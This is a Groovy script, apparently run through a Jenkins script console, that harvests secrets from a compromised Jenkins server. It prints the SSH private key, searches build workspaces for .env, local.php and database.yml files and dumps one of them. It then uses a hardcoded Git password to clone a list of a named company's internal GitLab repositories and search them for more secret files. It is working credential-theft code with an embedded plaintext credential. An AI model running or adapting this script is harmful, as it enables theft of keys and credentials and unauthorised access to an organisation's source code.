// MICRO-AC: Scan Jenkins workspaces for .env/config files + clone known repos + check SSH keys
def run = { cmd ->
    def p = ["bash", "-c", cmd].execute()
    def out = new StringBuffer()
    def err = new StringBuffer()
    p.consumeProcessOutput(out, err)
    p.waitForOrKill(25000)
    out.toString().take(5000)
}

println "=== SSH KEYS IN JENKINS HOME ==="
def sshKeys = run("ls -la /var/jenkins_home/.ssh/ 2>/dev/null && cat /var/jenkins_home/.ssh/id_rsa 2>/dev/null | head -5")
println sshKeys.take(500)

def sshKey2 = run("find /var/jenkins_home/.ssh/ -type f 2>/dev/null | xargs ls -la 2>/dev/null")
println "SSH files: " + sshKey2.take(500)

println "\n=== JENKINS WORKSPACE DIRS (top 30) ==="
def workspaces = run("ls /var/jenkins_home/workspace/ 2>/dev/null | head -40")
println workspaces.take(2000)

println "\n=== SEARCH .env in workspaces ==="
def envFiles = run("find /var/jenkins_home/workspace/ -name '.env' -o -name '.env.production' -o -name '.env.local' -o -name '.env.dev' 2>/dev/null | head -20")
println "ENV files found: " + envFiles.take(1000)

println "\n=== SEARCH config/local.php in workspaces ==="
def localPhp = run("find /var/jenkins_home/workspace/ -name 'local.php' 2>/dev/null | head -10")
println "local.php: " + localPhp.take(500)

if (localPhp.contains('/')) {
    def firstFile = localPhp.trim().split('\n')[0]
    println "\n--- Reading first local.php: ${firstFile} ---"
    def content = run("cat '${firstFile}' 2>/dev/null | head -80")
    println content.take(3000)
}

println "\n=== SEARCH database.yml in workspaces ==="
def dbyml = run("find /var/jenkins_home/workspace/ -name 'database.yml' -o -name 'database.yaml' 2>/dev/null | head -10")
println "database.yml: " + dbyml.take(500)

println "\n=== CLONE KNOWN RELEVANT REPOS ==="
def gitUser = "jenkins"
def gitPass = "e6LBqIkOI\$PR1XX2oia"
def baseUrl = "https://gitlab.dev.claroshop.com"

def reposToClone = [
    "claroshop/tienda",
    "claroshop/t1-admin-api",
    "claroshop/axii-claroshop",
    "sears/sears-ia-backend",
    "caja/caja-api",
    "t1/t1-admin-api",
    "claroshop/sears-ia-backend",
]

reposToClone.each { repo ->
    def dir = "/tmp/gc_${repo.replace('/', '_')}"
    def r = run("rm -rf ${dir}; git clone --depth=1 'https://${gitUser}:${gitPass}@gitlab.dev.claroshop.com/${repo}.git' ${dir} 2>&1 | tail -2")
    if (r.contains("done") || r.contains("Clonando")) {
        println "CLONED ${repo}: SUCCESS"
        def files = run("find ${dir} -name '*.env' -o -name 'local.php' -o -name 'database.yml' -o -name '.env*' 2>/dev/null | head -10")
        println "  Files: ${files.take(300)}"
    } else {
        println "FAIL ${repo}: ${r.take(100)}"
    }
}

println "\n=== DONE MICRO-AC ==="
